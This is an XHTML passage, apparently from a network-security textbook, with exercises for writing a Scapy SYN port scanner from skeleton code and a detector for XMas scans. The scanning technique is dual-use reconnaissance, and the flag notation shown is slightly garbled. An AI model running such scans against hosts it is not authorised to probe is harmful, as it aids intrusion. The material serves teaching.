+		<p class="noindent">Write a Python program that takes an IP address as a single command line argument and runs a SYN scan on all the ports for that address. Hint: use the Scapy library that we discussed in <a href="ch02.xhtml#ch2">Chapter 2</a>. The Scapy library uses the <span class="literal">/</span> operator to combine information between layers. For example, this line creates an IP packet and overrides its default fields with values from TCP:</p>
+		<p class="programs">syn_packet = IP(dst="192.168.1.101") / TCP( dport=443, flags='S')</p>
+		<p class="indent">This new SYN packet has the destination IP set to <span class="literal">192.168.1.101</span> and contains a TCP SYN packet with SYN flag <span class="literal">S</span> set. Also, its destination port value is set to <span class="literal">443</span>.</p>
+		<p class="indent">Here is some skeleton code to help you get started:</p>
+		<p class="programs">   from scapy.all import IP, ICMP,TCP, sr1<br/>
+   import sys<br/><br/><br/><span class="ent">➊</span> def icmp_probe(ip):<br/>
+       icmp_packet = IP(dst=ip)/ICMP()<br/>
+       resp_packet = sr1(icmp_packet, timeout=10)<br/>
+       return resp_packet != None<br/><br/><span class="ent">➋</span> def syn_scan(ip, port):<br/>
+       pass<br/><br/>
+   if __name__ == "__main__":<br/>
+       ip = sys.argv[1]<br/>
+       port = sys.argv[2]<br/>
+       if icmp_probe(ip):<br/>
+           syn_ack_packet = syn_scan(ip, port)<br/>
+           syn_ack_packet.show()<br/>
+       else:<br/>
+           print("ICMP Probe Failed")</p>
+		<p class="indent">We issue an ICMP packet to check whether the host is online <span class="ent">➊</span>. The program <span class="literal">traceroute</span>, which we discussed in <a href="ch03.xhtml#ch3">Chapter 3</a>, also uses this type of packet. Note that the Scapy <span class="literal">sr()</span> function sends and receives packets and the <span class="literal">sr1()</span> function sends and receives one packet only. If the host is available, start the SYN scan by sending a SYN packet and checking the response <span class="ent">➋</span>. If you don’t receive a response, that port is probably closed. However, if you receive a response, check that the response contains a TCP packet with the <span epub:type="pagebreak" id="page_63"/>SYN and ACK flags set. If only the SYN flag is set, the flag value of the TCP packet is will be set to <span class="literal">\0x02</span>. If only the ACK flag is set, the value will be <span class="literal">\x10</span>. If both are set, the flag value will be <span class="literal">\0x12</span>. If the response packet contains a TCP packet, you can check the packet’s flags using the following code snippet: <span class="literal">resp_packet.getlayer('TCP').flags == 0x12</span>.</p>
+		<h4 class="h4" id="ch04lev14"><strong><em>Detecting XMas Scans</em></strong></h4>
+		<p class="noindent">Write a program that uses the Scapy library (see <a href="ch02.xhtml#ch2">Chapter 2</a>) to detect XMas scans. Hint: examine the packets with the FIN, PSH, and URG flags set.<span epub:type="pagebreak" id="page_64"/></p>
+	</body>
+</html>
